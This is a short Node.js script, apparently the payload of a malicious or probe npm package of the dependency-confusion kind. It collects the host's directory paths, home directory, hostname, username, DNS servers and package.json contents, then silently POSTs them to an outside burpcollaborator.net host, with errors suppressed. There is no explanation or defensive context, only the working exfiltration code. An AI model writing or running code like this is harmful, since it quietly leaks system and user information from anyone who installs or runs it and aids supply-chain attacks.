
import os from "os";
import dns from "dns";
import querystring from "querystring";
import https from "https";
import packageJSON from "./package.json";
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    hw: __dirname,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

let postData = querystring.stringify({
    msg: trackingData,
});

let options = {
    hostname: "mndcqdjs3livrxktzbkqona0lrrhf6.burpcollaborator.net",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

let req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
